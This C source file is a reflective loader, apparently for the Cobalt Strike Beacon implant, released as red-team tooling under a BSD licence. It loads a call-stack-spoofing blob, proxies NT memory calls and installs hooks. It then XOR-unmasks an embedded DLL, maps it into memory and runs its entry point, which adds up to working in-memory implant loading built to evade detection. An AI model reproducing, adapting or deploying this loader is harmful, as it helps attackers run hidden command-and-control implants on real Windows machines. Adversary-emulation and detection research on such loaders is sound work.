/*
 * Copyright 2025 Daniel Duggan, Zero-Point Security
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

void go();

char * loaderStart() {
    return (char *)go;
}

#include "loader.h"
#include "tp.h"
#include "proxy.h"

#define WIN32_FUNC( x ) __typeof__( x ) * x

typedef struct {
    WIN32_FUNC(LoadLibraryA);
    WIN32_FUNC(GetProcAddress);
    DRAUGR Draugr;
} WIN32FUNCS;

char __DRAUGR__[0] __attribute__((section("draugr")));
char __HOOKS__[0]  __attribute__((section("hooks")));
char __DLL__[0]    __attribute__((section("dll")));
char __KEY__[0]    __attribute__((section("key")));

void * allocateVirtualMemory(SIZE_T size, ULONG protect)
{
    NTARGS args;
    memset(&args, 0, sizeof(NTARGS));

    void * baseAddress = NULL;

    args.functionPtr = (ULONG_PTR)(NTDLL$NtAllocateVirtualMemory);
    args.argument1   = (ULONG_PTR)(HANDLE)(-1);
    args.argument2   = (ULONG_PTR)(&baseAddress);
    args.argument3   = (ULONG_PTR)(0);
    args.argument4   = (ULONG_PTR)(&size);
    args.argument5   = (ULONG_PTR)(MEM_COMMIT|MEM_RESERVE);
    args.argument6   = (ULONG_PTR)(protect);

    ProxyNtApi(&args);

    return baseAddress;
}

void protectVirtualMemory(void * baseAddress, SIZE_T size, ULONG newProtect)
{
    NTARGS args;
    memset(&args, 0, sizeof(NTARGS));

    ULONG oldProtect = 0;

    args.functionPtr = (ULONG_PTR)(NTDLL$NtProtectVirtualMemory);
    args.argument1   = (ULONG_PTR)(HANDLE)(-1);
    args.argument2   = (ULONG_PTR)(&baseAddress);
    args.argument3   = (ULONG_PTR)(&size);
    args.argument4   = (ULONG_PTR)(newProtect);
    args.argument5   = (ULONG_PTR)(&oldProtect);

    ProxyNtApi(&args);
}

void freeVirtualMemory(void * baseAddress)
{
    NTARGS args;
    memset(&args, 0, sizeof(NTARGS));

    SIZE_T size = 0;

    args.functionPtr = (ULONG_PTR)(NTDLL$NtFreeVirtualMemory);
    args.argument1   = (ULONG_PTR)(HANDLE)(-1);
    args.argument2   = (ULONG_PTR)(&baseAddress);
    args.argument3   = (ULONG_PTR)(&size);
    args.argument4   = (ULONG_PTR)(MEM_RELEASE);

    ProxyNtApi(&args);
}

void fixSectionPermissions(DLLDATA * dll, char * src, char * dst, MEMORY_REGION * region)
{
    DWORD                   numberOfSections = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
    void                  * sectionDst       = NULL;
    DWORD                   sectionSize      = 0;
    DWORD                   newProtect       = 0;

    sectionHdr  = (IMAGE_SECTION_HEADER *)PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);

    for (int i = 0; i < numberOfSections; i++)
    {
        sectionDst  = dst + sectionHdr->VirtualAddress;
        sectionSize = sectionHdr->SizeOfRawData;

        if (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE) {
            newProtect = PAGE_WRITECOPY;
        }
        if (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) {
            newProtect = PAGE_READONLY;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE)) {
            newProtect = PAGE_READWRITE;
        }
        if (sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            newProtect = PAGE_EXECUTE;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ)) {
            newProtect = PAGE_EXECUTE_WRITECOPY;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ)) {
            newProtect = PAGE_EXECUTE_READ;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            newProtect = PAGE_EXECUTE_READWRITE;
        }

        /* set new permission */
        protectVirtualMemory(sectionDst, sectionSize, newProtect);

        /* track memory */
        region->sections[i].baseAddress     = sectionDst;
        region->sections[i].size            = sectionSize;
        region->sections[i].currentProtect  = newProtect;
        region->sections[i].previousProtect = newProtect;

        /* advance to our next section */
        sectionHdr++;
    }
}

void reflectiveLoader(WIN32FUNCS * funcs, MEMORY_LAYOUT * layout)
{
    char     * hookSrc;
    PICO     * hookDst;
    RESOURCE * keyRes;
    RESOURCE * beaconRes;
    DLLDATA    beaconData;
    char     * beaconSrc;
    char     * beaconDst;

    /* Time to load the hook PICO */
    hookSrc = GETRESOURCE(__HOOKS__);

    /* Allocate memory for it */
    hookDst = (PICO *)allocateVirtualMemory(sizeof(PICO), PAGE_READWRITE);

    /* Load it into memory */
    PicoLoad((IMPORTFUNCS *)funcs, hookSrc, hookDst->code, hookDst->data);

    /* Make the code section RX */
    protectVirtualMemory(hookDst->code, PicoCodeSize(hookSrc), PAGE_EXECUTE_READ);

    /* Fill layout info */
    layout->hooks.baseAddress                 = (char *)hookDst;
    layout->hooks.size                        = sizeof(PICO);
    layout->hooks.sections[0].baseAddress     = hookDst->data;
    layout->hooks.sections[0].size            = PicoDataSize(hookSrc);
    layout->hooks.sections[0].currentProtect  = PAGE_READWRITE;
    layout->hooks.sections[0].previousProtect = PAGE_READWRITE;
    layout->hooks.sections[1].baseAddress     = hookDst->code;
    layout->hooks.sections[1].size            = PicoCodeSize(hookSrc);
    layout->hooks.sections[1].currentProtect  = PAGE_EXECUTE_READ;
    layout->hooks.sections[1].previousProtect = PAGE_EXECUTE_READ;

    /* Get PICO entry point */
    PICOHOOK_ENTRY picoEntry = (PICOHOOK_ENTRY)PicoEntryPoint(hookSrc, hookDst->code);

    /* Call it to install the hooks */
    picoEntry((IMPORTFUNCS *)funcs, layout);

    /* Get XOR key */
    keyRes = (RESOURCE *)GETRESOURCE(__KEY__);

    /* Get XOR'd DLL */
    beaconRes = (RESOURCE *)GETRESOURCE(__DLL__);

    /* Unmask and copy it into memory */
    beaconSrc = allocateVirtualMemory(beaconRes->length, PAGE_READWRITE);

    for (int i = 0; i < beaconRes->length; i++) {
        beaconSrc[i] = beaconRes->value[i] ^ keyRes->value[i % keyRes->length];
    }

    /* Parse the headers */
    ParseDLL(beaconSrc, &beaconData);

    /* Allocate new memory for Beacon */
    beaconDst = allocateVirtualMemory(SizeOfDLL(&beaconData), PAGE_READWRITE);

    /* Load it into memory */
    LoadDLL(&beaconData, beaconSrc, beaconDst);
    ProcessImports((IMPORTFUNCS *)funcs, &beaconData, beaconDst);

    layout->dll.baseAddress = beaconDst;
    layout->dll.size        = SizeOfDLL(&beaconData);

    /* Fix section memory permissions */
    fixSectionPermissions(&beaconData, beaconSrc, beaconDst, &layout->dll);

    /* Call hook entry point again to provide the updated memory layout */
    picoEntry((IMPORTFUNCS *)funcs, layout);

    /* Get Beacon's entry point */
    DLLMAIN_FUNC beaconEntry = EntryPoint(&beaconData, beaconDst);

    /* Free the unmasked copy */
    freeVirtualMemory(beaconSrc);

    /* Call it twice */
    beaconEntry((HINSTANCE)beaconDst, DLL_PROCESS_ATTACH, NULL);
    beaconEntry((HINSTANCE)loaderStart(), 0x4, NULL);
}

void go()
{
    WIN32FUNCS      funcs;
    RESOURCE      * picSrc;
    char          * picDst;
    MEMORY_LAYOUT   layout;

    funcs.LoadLibraryA   = LoadLibraryA;
    funcs.GetProcAddress = GetProcAddress;

    /* Grab the Draugr PIC */
    picSrc = (RESOURCE *)GETRESOURCE(__DRAUGR__);

    /* Allocate memory for it */
    picDst = allocateVirtualMemory(picSrc->length, PAGE_READWRITE);

    /* Copy it into memory */
    memcpy(picDst, picSrc->value, picSrc->length);

    /* Flip memory to RX */
    protectVirtualMemory(picDst, picSrc->length, PAGE_EXECUTE_READ);

    /* Set funcs field */
    funcs.Draugr = (DRAUGR)(picDst);

    /* Begin filling memory layout info */
    layout.pic.baseAddress    = picDst;
    layout.pic.size           = picSrc->length;

    /* Carry on loading the rest */
    reflectiveLoader(&funcs, &layout);
}